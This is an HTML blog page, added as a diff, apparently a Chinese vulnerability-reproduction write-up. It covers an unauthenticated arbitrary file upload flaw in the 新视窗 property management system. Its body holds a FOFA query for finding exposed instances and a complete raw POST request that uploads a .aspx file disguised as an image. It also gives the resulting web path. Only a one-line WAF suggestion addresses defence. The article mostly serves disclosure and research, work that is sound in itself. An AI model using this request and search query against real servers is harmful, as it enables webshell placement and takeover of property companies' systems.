@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="新视窗新一代物业管理系统任意文件上传漏洞前言        新视窗新一代物业管理系统该系统涵盖了物业管理全流程，包括客户服务、业户管理、报事报修、设施设备管理、财务管理等功能，具有灵活的多组织架构，可以满足不同规模物业公司的需求。该系统某接口对上传的文件校验逻辑存在缺陷，导致攻击者可以上传webshell文件到服务器，进而可以getshell。 声明：文章中涉及的内容可能带有攻击性，仅供安全研究与">
+<meta property="og:type" content="article">
+<meta property="og:title" content="新视窗新一代物业管理系统任意文件上传漏洞">
+<meta property="og:url" content="https://garckz.github.io/2024/04/15/%E6%96%B0%E8%A7%86%E7%AA%97%E6%96%B0%E4%B8%80%E4%BB%A3%E7%89%A9%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="兀自">
+<meta property="og:description" content="新视窗新一代物业管理系统任意文件上传漏洞前言        新视窗新一代物业管理系统该系统涵盖了物业管理全流程，包括客户服务、业户管理、报事报修、设施设备管理、财务管理等功能，具有灵活的多组织架构，可以满足不同规模物业公司的需求。该系统某接口对上传的文件校验逻辑存在缺陷，导致攻击者可以上传webshell文件到服务器，进而可以getshell。 声明：文章中涉及的内容可能带有攻击性，仅供安全研究与">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://garckz.github.io/2024/04/15/%E6%96%B0%E8%A7%86%E7%AA%97%E6%96%B0%E4%B8%80%E4%BB%A3%E7%89%A9%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/qES8uh4t2s0-0Yi2EyzqT1Q3moDeYbFMvjNBN_IkWiU.png">
+<meta property="og:image" content="https://garckz.github.io/2024/04/15/%E6%96%B0%E8%A7%86%E7%AA%97%E6%96%B0%E4%B8%80%E4%BB%A3%E7%89%A9%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/NeQcpeXVWbsGN0PuJAqzco26q22T4iNBznGwt2SfHBE.png">
+<meta property="og:image" content="https://garckz.github.io/2024/04/15/%E6%96%B0%E8%A7%86%E7%AA%97%E6%96%B0%E4%B8%80%E4%BB%A3%E7%89%A9%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/bbUyJx34twno7R9WTjnK6GTEA7knDEAqf5jV1P1lwYA.png">
+<meta property="article:published_time" content="2024-04-15T03:40:49.000Z">
+<meta property="article:modified_time" content="2024-04-17T00:58:43.830Z">
+<meta property="article:author" content="Garck3h">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://garckz.github.io/2024/04/15/%E6%96%B0%E8%A7%86%E7%AA%97%E6%96%B0%E4%B8%80%E4%BB%A3%E7%89%A9%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/qES8uh4t2s0-0Yi2EyzqT1Q3moDeYbFMvjNBN_IkWiU.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>新视窗新一代物业管理系统任意文件上传漏洞</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/01/26/Jenkins%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-23897%EF%BC%89/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2024/04/15/%E6%96%B0%E8%A7%86%E7%AA%97%E6%96%B0%E4%B8%80%E4%BB%A3%E7%89%A9%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2024/04/15/%E6%96%B0%E8%A7%86%E7%AA%97%E6%96%B0%E4%B8%80%E4%BB%A3%E7%89%A9%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&text=新视窗新一代物业管理系统任意文件上传漏洞"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2024/04/15/%E6%96%B0%E8%A7%86%E7%AA%97%E6%96%B0%E4%B8%80%E4%BB%A3%E7%89%A9%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&title=新视窗新一代物业管理系统任意文件上传漏洞"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2024/04/15/%E6%96%B0%E8%A7%86%E7%AA%97%E6%96%B0%E4%B8%80%E4%BB%A3%E7%89%A9%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&is_video=false&description=新视窗新一代物业管理系统任意文件上传漏洞"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=新视窗新一代物业管理系统任意文件上传漏洞&body=Check out this article: https://garckz.github.io/2024/04/15/%E6%96%B0%E8%A7%86%E7%AA%97%E6%96%B0%E4%B8%80%E4%BB%A3%E7%89%A9%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2024/04/15/%E6%96%B0%E8%A7%86%E7%AA%97%E6%96%B0%E4%B8%80%E4%BB%A3%E7%89%A9%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&title=新视窗新一代物业管理系统任意文件上传漏洞"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2024/04/15/%E6%96%B0%E8%A7%86%E7%AA%97%E6%96%B0%E4%B8%80%E4%BB%A3%E7%89%A9%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&title=新视窗新一代物业管理系统任意文件上传漏洞"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2024/04/15/%E6%96%B0%E8%A7%86%E7%AA%97%E6%96%B0%E4%B8%80%E4%BB%A3%E7%89%A9%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&title=新视窗新一代物业管理系统任意文件上传漏洞"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2024/04/15/%E6%96%B0%E8%A7%86%E7%AA%97%E6%96%B0%E4%B8%80%E4%BB%A3%E7%89%A9%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&title=新视窗新一代物业管理系统任意文件上传漏洞"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2024/04/15/%E6%96%B0%E8%A7%86%E7%AA%97%E6%96%B0%E4%B8%80%E4%BB%A3%E7%89%A9%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&name=新视窗新一代物业管理系统任意文件上传漏洞&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2024/04/15/%E6%96%B0%E8%A7%86%E7%AA%97%E6%96%B0%E4%B8%80%E4%BB%A3%E7%89%A9%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&t=新视窗新一代物业管理系统任意文件上传漏洞"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%B0%E8%A7%86%E7%AA%97%E6%96%B0%E4%B8%80%E4%BB%A3%E7%89%A9%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">新视窗新一代物业管理系统任意文件上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FOFA%E8%AF%AD%E6%B3%95"><span class="toc-number">1.2.</span> <span class="toc-text">FOFA语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.4.</span> <span class="toc-text">修复建议</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        新视窗新一代物业管理系统任意文件上传漏洞
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Garck3h</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-04-15T03:40:49.000Z" class="dt-published" itemprop="datePublished">2024-04-15</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="新视窗新一代物业管理系统任意文件上传漏洞"><a href="#新视窗新一代物业管理系统任意文件上传漏洞" class="headerlink" title="新视窗新一代物业管理系统任意文件上传漏洞"></a>新视窗新一代物业管理系统任意文件上传漏洞</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>        新视窗新一代物业管理系统该系统涵盖了物业管理全流程，包括客户服务、业户管理、报事报修、设施设备管理、财务管理等功能，具有灵活的多组织架构，可以满足不同规模物业公司的需求。该系统某接口对上传的文件校验逻辑存在缺陷，导致攻击者可以上传webshell文件到服务器，进而可以getshell。</p>
+<p>声明：文章中涉及的内容可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</p>
+<h2 id="FOFA语法"><a href="#FOFA语法" class="headerlink" title="FOFA语法"></a>FOFA语法</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">body=<span class="string">&quot;BPMSite/ClientSupport/OCXInstall.aspx&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img src="qES8uh4t2s0-0Yi2EyzqT1Q3moDeYbFMvjNBN_IkWiU.png" alt="image"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接未授权访问接口进行上传文件</p>
+<p><img src="NeQcpeXVWbsGN0PuJAqzco26q22T4iNBznGwt2SfHBE.png" alt="image"></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /OfficeManagement/RegisterManager/Upload.aspx HTTP/<span class="number">1.1</span></span><br><span class="line">User-Agent<span class="punctuation">:</span> Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10</span>_15_7) AppleWebKit/<span class="number">537.36</span> (KHTML<span class="punctuation">,</span> like Gecko) Chrome/<span class="number">93.0</span><span class="number">.4577</span><span class="number">.63</span> Safari/<span class="number">537.36</span></span><br><span class="line">Cookie<span class="punctuation">:</span> JSESSIONID=FC2204F3698D2A07CDE9786055A071CB</span><br><span class="line">Content-Type<span class="punctuation">:</span> multipart/form-data; boundary=<span class="number">00</span>content0boundary00</span><br><span class="line">Host<span class="punctuation">:</span> </span><br><span class="line">Accept<span class="punctuation">:</span> text/html<span class="punctuation">,</span> image/gif<span class="punctuation">,</span> image/jpeg<span class="punctuation">,</span> *; q=<span class="number">.2</span><span class="punctuation">,</span> *<span class="comment">/*; q=.2</span></span><br><span class="line"><span class="comment">Content-Length: 146</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--00content0boundary00</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.aspx&quot;</span></span><br><span class="line"><span class="comment">Content-Type: image/jpg</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">GIF89a</span></span><br><span class="line"><span class="comment">123</span></span><br><span class="line"><span class="comment">--00content0boundary00--</span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure>
+<p>访问路径</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Upload/ContractMamager/<span class="number">71</span>d52920be4d<span class="number">-4956</span><span class="number">-93</span>f9<span class="number">-77</span>c3b0c899e81.aspx</span><br></pre></td></tr></table></figure>
+<p><img src="bbUyJx34twno7R9WTjnK6GTEA7knDEAqf5jV1P1lwYA.png" alt="image"></p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>配置WAF针对该URI进行特定数据包内容匹配后拦截</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">文章</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%B0%E8%A7%86%E7%AA%97%E6%96%B0%E4%B8%80%E4%BB%A3%E7%89%A9%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">新视窗新一代物业管理系统任意文件上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FOFA%E8%AF%AD%E6%B3%95"><span class="toc-number">1.2.</span> <span class="toc-text">FOFA语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.4.</span> <span class="toc-text">修复建议</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2024/04/15/%E6%96%B0%E8%A7%86%E7%AA%97%E6%96%B0%E4%B8%80%E4%BB%A3%E7%89%A9%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2024/04/15/%E6%96%B0%E8%A7%86%E7%AA%97%E6%96%B0%E4%B8%80%E4%BB%A3%E7%89%A9%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&text=新视窗新一代物业管理系统任意文件上传漏洞"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2024/04/15/%E6%96%B0%E8%A7%86%E7%AA%97%E6%96%B0%E4%B8%80%E4%BB%A3%E7%89%A9%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&title=新视窗新一代物业管理系统任意文件上传漏洞"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2024/04/15/%E6%96%B0%E8%A7%86%E7%AA%97%E6%96%B0%E4%B8%80%E4%BB%A3%E7%89%A9%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&is_video=false&description=新视窗新一代物业管理系统任意文件上传漏洞"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=新视窗新一代物业管理系统任意文件上传漏洞&body=Check out this article: https://garckz.github.io/2024/04/15/%E6%96%B0%E8%A7%86%E7%AA%97%E6%96%B0%E4%B8%80%E4%BB%A3%E7%89%A9%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2024/04/15/%E6%96%B0%E8%A7%86%E7%AA%97%E6%96%B0%E4%B8%80%E4%BB%A3%E7%89%A9%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&title=新视窗新一代物业管理系统任意文件上传漏洞"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2024/04/15/%E6%96%B0%E8%A7%86%E7%AA%97%E6%96%B0%E4%B8%80%E4%BB%A3%E7%89%A9%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&title=新视窗新一代物业管理系统任意文件上传漏洞"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2024/04/15/%E6%96%B0%E8%A7%86%E7%AA%97%E6%96%B0%E4%B8%80%E4%BB%A3%E7%89%A9%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&title=新视窗新一代物业管理系统任意文件上传漏洞"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2024/04/15/%E6%96%B0%E8%A7%86%E7%AA%97%E6%96%B0%E4%B8%80%E4%BB%A3%E7%89%A9%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&title=新视窗新一代物业管理系统任意文件上传漏洞"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2024/04/15/%E6%96%B0%E8%A7%86%E7%AA%97%E6%96%B0%E4%B8%80%E4%BB%A3%E7%89%A9%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&name=新视窗新一代物业管理系统任意文件上传漏洞&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2024/04/15/%E6%96%B0%E8%A7%86%E7%AA%97%E6%96%B0%E4%B8%80%E4%BB%A3%E7%89%A9%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&t=新视窗新一代物业管理系统任意文件上传漏洞"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+    <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2019-2024
+        Garck3h
+    </div>
+    <div class="footer-right">
+        <nav>
+
+            <ul>
+                
+                    <!-- 不蒜子统计 -->
+                    <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+
+                    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+
+
+        </nav>
+    </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
